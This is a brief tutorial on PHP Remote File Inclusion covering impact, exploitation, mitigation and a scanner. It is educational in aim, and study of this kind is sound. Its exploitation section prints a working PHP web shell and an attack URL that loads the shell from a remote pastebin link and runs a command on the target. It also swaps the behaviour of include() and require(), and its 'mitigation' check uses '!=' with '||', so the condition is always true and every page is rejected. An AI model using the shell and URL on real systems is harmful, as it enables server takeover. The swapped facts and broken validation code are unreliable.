# Remote File Inclusion (RFI)

> Remote File Inclusion is a vulnerability that occurs when the web application allows the user to submit input into files or upload files to the server. In some cases the attacker is able to run arbitrary code on the server .

The Remote File Inclusion is easier to exploit but  rare to be found . it allows the attacker to include a file remotely that is hosted on his machine which will lead him to get RCE on the server . 

## Impact 
1. Sensitive information Disclosure
2. Code execution on the web server 

#### Exploitation example 

In php to include files there is some function can be used like : 

1. **include()**:  if fill not found it will produce a fatal error (E_COMPILE_ERROR) and stop the script
2. **require()**:  if fill not found it will only produce a warning (E_WARNING) and the script will continue

**Example** :

The Remote File Inclusion as said is rare to be found but easier to be exploited. For an RFI to be successful, two functions in PHP’s configuration file need to be set ie `allow_url_fopen` and `allow_url_include` both need to be ‘On’. 

To exploit it you need to host a php code on your server or on any online service like [pastebin](https://pastebin.com/)

```
<?php
	system($_GET['cmd']);
?>
```
From the vulnerable point in the web application send the URL of that code.
`http://vulnerable-website/home/index.php?page=https://pastebin.com/raw/0JNDJb5g&cmd=ls -la`

## Mitigation
1. Input validation is needed : you need to validate the user input to avoid any chances for LFI/RFI attacks
```
<?php
$file = $_GET['file'];

if ($file != "home.php" || $file != "profile.php" || $file != "contact.php"){
	echo "Error: Page Not Found";
	exit();
}
?>
```
2. Disable allow_url_fopen and allow_url_include if they are not needed in the web application.

## Tools
[Fimap](https://tools.kali.org/web-applications/fimap) - python tool which can find LFI/RFI in web apps.
